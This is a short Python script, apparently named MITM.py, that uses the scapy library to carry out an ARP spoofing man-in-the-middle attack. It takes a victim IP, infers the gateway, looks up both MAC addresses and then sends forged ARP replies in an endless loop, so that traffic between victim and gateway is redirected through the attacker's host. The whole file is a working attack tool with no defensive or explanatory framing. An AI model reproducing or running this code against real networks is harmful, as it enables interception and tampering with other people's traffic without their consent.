#!/usr/bin/python3

#running command: python MITM.py victimIP

import sys  #for command line argument
import time
from random import randint
from scapy.all import *
from scapy.layers.inet import *
import scapy
import socket
import uuid 


def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP


my_ip = get_ip()

my_mac = str(':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) 
for ele in range(0,8*6,8)][::-1])) 

print(my_ip)
print(my_mac)

victim_ip = sys.argv[1]

# victim_ip = "192.168.0.106"	#for testing


network_parts = str(victim_ip).split(".")
gateway = network_parts[0]+ "."+network_parts[1]+ "."+network_parts[2]+ ".1" 

broadcastNet = network_parts[0]+ "."+network_parts[1]+ "."+network_parts[2]+ ".255" 

# print(str(my_ip) + " " + str(victim_ip) + " " + gateway)


arp_packet = ARP(op=ARP.who_has, psrc=my_ip, pdst=victim_ip)
result = sr1(arp_packet)
victim_mac = result[ARP].hwsrc


arp_packet = ARP(op=ARP.who_has, psrc=my_ip, pdst=gateway)
result = sr1(arp_packet)
gateway_mac = result[ARP].hwsrc

#######################################################################################################################

reply1 = ARP(op=ARP.is_at, hwsrc=my_mac, psrc=victim_ip, hwdst=gateway_mac, pdst=gateway)
go1 = Ether(dst=gateway_mac, src=my_mac) / reply1

reply2 = ARP(op=ARP.is_at, hwsrc=my_mac, psrc=gateway, hwdst=victim_mac, pdst=victim_ip)
go2 = Ether(dst=victim_mac, src=my_mac) / reply2

while  1:
	print(go1.summary())
	sendp(go1, verbose = 2)
	print()

	print(go2.summary())
	sendp(go2, verbose = 2)
	print()

	time.sleep(randint(1, 5))